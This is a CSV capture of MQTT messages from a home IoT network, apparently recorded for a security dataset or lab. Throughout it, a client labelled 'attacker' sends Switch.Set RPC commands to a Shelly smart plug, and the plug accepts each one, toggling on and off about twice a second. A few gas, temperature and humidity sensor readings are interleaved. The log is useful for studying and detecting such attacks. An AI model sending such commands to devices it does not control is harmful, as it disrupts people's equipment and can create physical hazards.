2026-04-22T16:40:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34550.65,""swi"
2026-04-22T16:40:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5605 34550.674 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5606 34551.162 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34551.16,""swi"
2026-04-22T16:40:18,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5607 34551.181 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:18,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:18,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5608 34551.661 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:18,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:18,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34551.66,""swi"
2026-04-22T16:40:18,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5609 34551.677 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:19,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:19,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5610 34552.162 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:19,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:19,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34552.16,""swi"
2026-04-22T16:40:19,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5611 34552.180 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:19,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:19,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5612 34552.662 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:19,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:19,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34552.66,""swi"
2026-04-22T16:40:19,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5613 34552.678 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:20,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:20,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5614 34553.163 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:20,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:20,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34553.16,""swi"
2026-04-22T16:40:20,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5615 34553.182 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:20,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:20,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5616 34553.666 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:20,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:20,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34553.66,""swi"
2026-04-22T16:40:20,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5617 34553.683 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:21,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:21,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5618 34554.165 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:21,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:21,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34554.16,""swi"
2026-04-22T16:40:21,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5619 34554.183 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:21,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:21,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5620 34554.665 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:21,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:21,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34554.66,""swi"
2026-04-22T16:40:21,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5621 34554.681 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:22,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5622 34555.165 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:22,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:22,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34555.16,""swi"
2026-04-22T16:40:22,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5623 34555.184 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:22,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5624 34555.665 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:22,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:22,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34555.66,""swi"
2026-04-22T16:40:22,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5625 34555.682 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5626 34556.166 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34556.16,""swi"
2026-04-22T16:40:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5627 34556.185 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5628 34556.667 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34556.66,""swi"
2026-04-22T16:40:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5629 34556.684 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5630 34557.168 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34557.16,""swi"
2026-04-22T16:40:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5631 34557.188 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5632 34557.668 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34557.66,""swi"
2026-04-22T16:40:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5633 34557.684 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5634 34558.171 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34558.17,""swi"
2026-04-22T16:40:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5635 34558.190 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5636 34558.670 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34558.67,""swi"
2026-04-22T16:40:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5637 34558.686 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5638 34559.170 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34559.17,""swi"
2026-04-22T16:40:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5639 34559.189 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5640 34559.671 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34559.67,""swi"
2026-04-22T16:40:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5641 34559.687 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:40:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:40:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:40:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:40:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5642 34560.171 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34560.17,""swi"
2026-04-22T16:40:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5643 34560.190 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5644 34560.672 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34560.67,""swi"
2026-04-22T16:40:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5645 34560.688 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5646 34561.172 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34561.17,""swi"
2026-04-22T16:40:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5647 34561.191 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:28,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:28,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5648 34561.673 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:28,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:28,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34561.67,""swi"
2026-04-22T16:40:28,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5649 34561.689 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:29,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:29,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5650 34562.173 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:29,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:29,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34562.17,""swi"
2026-04-22T16:40:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5651 34562.192 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5652 34562.674 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34562.67,""swi"
2026-04-22T16:40:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5653 34562.690 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5654 34563.175 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34563.17,""swi"
2026-04-22T16:40:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5655 34563.194 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5656 34563.675 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
